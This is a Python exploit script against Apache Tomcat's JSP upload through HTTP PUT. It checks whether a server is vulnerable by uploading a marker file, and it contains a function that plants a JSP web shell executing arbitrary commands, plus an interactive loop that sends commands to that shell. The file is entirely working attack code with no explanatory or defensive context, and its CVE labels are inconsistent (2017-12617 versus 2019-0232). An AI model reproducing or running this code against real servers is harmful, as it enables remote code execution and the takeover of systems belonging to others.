import requests
import re
import signal
import sys
from optparse import OptionParser

def signal_handler(signal, frame):

    print("\033[91m"+"\n[-] Exiting"+"\033[0m")

    exit()

signal.signal(signal.SIGINT, signal_handler)

def removetags(tags):
  remove = re.compile('<.*?>')
  txt = re.sub(remove, '\n', tags)
  return txt.replace("\n\n\n","\n")


def getContent(url,f):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    re=requests.get(str(url)+"/"+str(f), headers=headers,verify=False)
    return re.content

def createPayload(url,f):
    evil='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    req=requests.put(str(url)+str(f)+"/",data=evil, headers=headers,verify=False)
    if req.status_code==201:
        print("File Created ..")

   
def RCE(url,f):
    EVIL="""<FORM METHOD=GET ACTION='{}'>""".format(f)+"""
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>"""


    
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    req=requests.put(str(url)+f+"/",data=EVIL, headers=headers,verify=False)
    


def shell(url,f):
    
    while True:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        cmd=raw_input("$ ")
        payload={'cmd':cmd}
        if cmd=="q" or cmd=="Q":
                break
        requests.packages.urllib3.disable_warnings()
        re=requests.get(str(url)+"/"+str(f),params=payload,headers=headers,verify=False)
        re=str(re.content)
        t=removetags(re)
        print (t)



def run(url,port):
    if int(port)==443 or int(port)==8443:
      url="https://"+str(url)+":"+str(port)
    else:
      url="http://"+str(url)+":"+str(port)
    checker="Poc.jsp"
    createPayload(str(url)+"/",checker)
    con=getContent(str(url)+"/",checker)
    con1=str(con)
    vurl=url+"/"+checker
    if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con1:
      #print ("[+] [%s] is Vulnerable to cve_2019_0232!"%vurl)
      return (1,"[+] [%s] is Vulnerable to cve_2019_0232!"%vurl)
    else:
      #print("[-] %s seems no vuln to cve_2017_12617"%url)
      return (0,"[-] %s seems no vuln to cve_2017_12617"%url)


def run(url,port):
    try:
        if int(port)==443 or int(port)==8443:
          url="https://"+str(url)+":"+str(port)
        else:
          url="http://"+str(url)+":"+str(port)
        checker="Poc.jsp"
        createPayload(str(url)+"/",checker)
        con=getContent(str(url)+"/",checker)
        con1=str(con)
        vurl=url+"/"+checker
        if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con1:
          #print ("[+] [%s] is Vulnerable to cve_2019_0232!"%vurl)
          return (1,"[+] [%s] is Vulnerable to cve_2019_0232!"%vurl)
        else:
          #print("[-] %s seems no vuln to cve_2017_12617"%url)
          return (0,"[-] %s seems no vuln to cve_2017_12617"%url)
    except Exception:
        return (0,"[-] %s seems no vuln to cve_2017_12617"%url)
if __name__=="__main__":
    url = sys.argv[1]
    port = int(sys.argv[2])
    run(url,port)











